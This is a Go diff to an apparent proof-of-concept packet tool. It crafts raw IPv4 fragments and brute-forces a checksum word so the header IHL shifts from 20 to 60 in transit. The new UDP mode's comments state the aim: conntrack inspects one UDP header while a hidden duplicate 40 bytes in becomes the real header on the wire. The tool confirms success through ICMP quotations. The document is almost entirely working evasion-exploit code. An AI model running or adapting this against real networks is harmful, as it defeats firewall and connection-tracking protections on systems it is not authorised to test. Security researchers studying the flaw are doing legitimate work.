@@ -20,6 +20,9 @@ const (
 	packetVnetHdr = 15
 	ethPAll       = 0x0003
 	ipProtoICMP   = 1
+	ipProtoUDP    = 17
+	ipProtoRaw    = 253
+	mutatedIHL    = 60
 )
 
 type egressRoute struct {
@@ -34,6 +37,7 @@ type egressCaptureStats struct {
 	txFragments int
 	icmpPackets int
 	quoted253   int
+	quotedUDP   int
 	matched     bool
 }
 
@@ -80,38 +84,62 @@ func runEgress(c cfg) error {
 		return fmt.Errorf("interface MTU %d is too small for double-VLAN IPv4 fragments", ifi.MTU)
 	}
 	fragments := (c.egressRest + maxChunk - 1) / maxChunk
-	fmt.Printf("egress: iface=%s mtu=%d src=%s src_mac=%s dst=%s next_hop=%s next_mac=%s route=%s/%d payload=%d fragments=%d+head\n",
+	proto := byte(ipProtoRaw)
+	if c.transport == "udp" {
+		proto = ipProtoUDP
+	}
+	fmt.Printf("egress: iface=%s mtu=%d src=%s src_mac=%s dst=%s next_hop=%s next_mac=%s route=%s/%d transport=%s payload=%d fragments=%d+head\n",
 		ifi.Name, ifi.MTU, src, ifi.HardwareAddr, dst, nextHop, nextMAC,
-		routeIPv4(route.dest), route.prefix, c.head+c.egressRest, fragments)
+		routeIPv4(route.dest), route.prefix, c.transport, c.head+c.egressRest, fragments)
 
 	seen := false
 	for sample := 0; sample < c.count; sample++ {
 		id := uint16(ipID + sample)
 		payload := make([]byte, c.head+c.egressRest)
-		for i := 0; i < c.head; i++ {
-			payload[i] = marker
-		}
-		for i := c.head; i < len(payload); i++ {
+		for i := range payload {
 			payload[i] = 0x11
 		}
-		if !egressSolve(payload, id, src, dst) {
+		if c.transport == "udp" {
+			egressUDPHeaders(payload, uint16(c.udpPort))
+		} else {
+			for i := 0; i < c.head; i++ {
+				payload[i] = marker
+			}
+		}
+		if !egressSolve(payload, id, src, dst, proto) {
 			return fmt.Errorf("sample %d: solver found no 0x4f00 adjustment", sample)
 		}
-		if err := egressSendSequence(tx, ifi, ifi.HardwareAddr, nextMAC, src, dst, id, payload, c.head, maxChunk); err != nil {
+		if err := egressSendSequence(tx, ifi, ifi.HardwareAddr, nextMAC, src, dst, id, proto, payload, c.head, maxChunk); err != nil {
 			return fmt.Errorf("sample %d: %w", sample, err)
 		}
-		stats, err := egressCollectICMP(rx, c.egressWait, id, dst, c.head)
+		stats, err := egressCollectICMP(rx, c.egressWait, id, dst, proto, c.head)
 		if err != nil {
 			return fmt.Errorf("sample %d capture: %w", sample, err)
 		}
-		fmt.Printf("capture: id=0x%04x tx_fragments=%d icmp=%d quoted_proto253=%d matched=%t\n",
-			id, stats.txFragments, stats.icmpPackets, stats.quoted253, stats.matched)
+		fmt.Printf("capture: id=0x%04x tx_fragments=%d icmp=%d quoted_udp=%d quoted_proto253=%d matched=%t\n",
+			id, stats.txFragments, stats.icmpPackets, stats.quotedUDP, stats.quoted253, stats.matched)
 		seen = seen || stats.matched
 	}
 	if !seen {
 		return errors.New("no matching ICMP quotation received; confirm the destination emits protocol-unreachable ICMP or capture packets at the controlled endpoint")
 	}
 	return nil
+}
+
+func egressUDPHeaders(payload []byte, dstPort uint16) {
+	// Before the checksum write, conntrack sees this ordinary UDP header at
+	// payload offset zero. A zero IPv4 UDP checksum is valid.
+	putUDPHeader(payload[:8], 0x0101, dstPort, uint16(len(payload)))
+	// After IHL changes from 20 to 60, fragmentation skips 40 bytes of the
+	// original payload. This duplicate becomes the UDP header on the wire.
+	putUDPHeader(payload[40:48], 0x0101, dstPort, uint16(len(payload)-40))
+}
+
+func putUDPHeader(dst []byte, srcPort, dstPort, length uint16) {
+	binary.BigEndian.PutUint16(dst[0:2], srcPort)
+	binary.BigEndian.PutUint16(dst[2:4], dstPort)
+	binary.BigEndian.PutUint16(dst[4:6], length)
+	binary.BigEndian.PutUint16(dst[6:8], 0)
 }
 
 func egressSourceIP(ifi *net.Interface, override string) (net.IP, error) {
@@ -277,17 +305,17 @@ func egressPacketSocket(ifindex int, vnet bool) (int, error) {
 	return fd, nil
 }
 
-func egressSendSequence(fd int, ifi *net.Interface, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, id uint16, payload []byte, head, maxChunk int) error {
+func egressSendSequence(fd int, ifi *net.Interface, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, id uint16, proto byte, payload []byte, head, maxChunk int) error {
 	for offset := head; offset < len(payload); {
 		n := min(maxChunk, len(payload)-offset)
 		more := offset+n < len(payload)
-		ip := egressFragment(offset, more, payload[offset:offset+n], id, srcIP, dstIP)
+		ip := egressFragment(offset, more, payload[offset:offset+n], id, srcIP, dstIP, proto)
 		if err := egressSendFrame(fd, ifi.Index, dstMAC, egressFrame(ip, srcMAC, dstMAC), true, l2Len+ipLen); err != nil {
 			return fmt.Errorf("send fragment offset=%d length=%d: %w", offset, n, err)
 		}
 		offset += n
 	}
-	first := egressFragment(0, true, payload[:head], id, srcIP, dstIP)
+	first := egressFragment(0, true, payload[:head], id, srcIP, dstIP, proto)
 	if err := egressSendFrame(fd, ifi.Index, dstMAC, egressFrame(first, srcMAC, dstMAC), true, csumAtIP); err != nil {
 		return fmt.Errorf("send head fragment: %w", err)
 	}
@@ -307,7 +335,7 @@ func egressSendFrame(fd, ifindex int, dstMAC net.HardwareAddr, frame []byte, che
 	return syscall.Sendto(fd, buf, 0, addr)
 }
 
-func egressSolve(payload []byte, id uint16, src, dst net.IP) bool {
+func egressSolve(payload []byte, id uint16, src, dst net.IP, proto byte) bool {
 	const adjust = 32
 	if adjust+1 >= ipLen+len(payload) {
 		return false
@@ -316,7 +344,7 @@ func egressSolve(payload []byte, id uint16, src, dst net.IP) bool {
 	for word := 0; word < 65536; word++ {
 		payload[off] = byte(word)
 		payload[off+1] = byte(word >> 8)
-		pkt := egressFragment(0, false, payload, id, src, dst)
+		pkt := egressFragment(0, false, payload, id, src, dst, proto)
 		forwardTTL(pkt)
 		if csumFold(csumPartial(pkt)) == 0x004f {
 			return true
@@ -325,7 +353,11 @@ func egressSolve(payload []byte, id uint16, src, dst net.IP) bool {
 	return false
 }
 
-func egressFragment(offset int, more bool, payload []byte, id uint16, src, dst net.IP) []byte {
+func egressFragment(offset int, more bool, payload []byte, id uint16, src, dst net.IP, protoOpt ...byte) []byte {
+	proto := byte(ipProtoRaw)
+	if len(protoOpt) > 0 {
+		proto = protoOpt[0]
+	}
 	pkt := make([]byte, ipLen+len(payload))
 	pkt[0] = 0x45
 	binary.BigEndian.PutUint16(pkt[2:], uint16(len(pkt)))
@@ -336,7 +368,7 @@ func egressFragment(offset int, more bool, payload []byte, id uint16, src, dst n
 	}
 	binary.BigEndian.PutUint16(pkt[6:], frag)
 	pkt[8] = 64
-	pkt[9] = 253
+	pkt[9] = proto
 	copy(pkt[12:16], src.To4())
 	copy(pkt[16:20], dst.To4())
 	copy(pkt[ipLen:], payload)
@@ -357,7 +389,7 @@ func egressFrame(ip []byte, src, dst net.HardwareAddr) []byte {
 	return f
 }
 
-func egressCollectICMP(fd int, wait time.Duration, id uint16, dst net.IP, head int) (egressCaptureStats, error) {
+func egressCollectICMP(fd int, wait time.Duration, id uint16, dst net.IP, proto byte, head int) (egressCaptureStats, error) {
 	deadline := time.Now().Add(wait)
 	buf := make([]byte, 65536)
 	stats := egressCaptureStats{}
@@ -373,7 +405,7 @@ func egressCollectICMP(fd int, wait time.Duration, id uint16, dst net.IP, head i
 		if len(outer) < ipLen {
 			continue
 		}
-		if outer[9] == 253 && binary.BigEndian.Uint16(outer[4:]) == id {
+		if outer[9] == proto && binary.BigEndian.Uint16(outer[4:]) == id {
 			stats.txFragments++
 		}
 		if outer[9] != ipProtoICMP {
@@ -389,10 +421,18 @@ func egressCollectICMP(fd int, wait time.Duration, id uint16, dst net.IP, head i
 			continue
 		}
 		quoted := icmp[8:]
-		if quoted[0]>>4 != 4 || quoted[9] != 253 {
+		if quoted[0]>>4 != 4 {
 			continue
 		}
-		stats.quoted253++
+		switch quoted[9] {
+		case ipProtoRaw:
+			stats.quoted253++
+		case ipProtoUDP:
+			stats.quotedUDP++
+		}
+		if quoted[9] != proto {
+			continue
+		}
 		quotedID := binary.BigEndian.Uint16(quoted[4:])
 		quotedDst := net.IP(quoted[16:20])
 		if quotedID != id || !quotedDst.Equal(dst) {
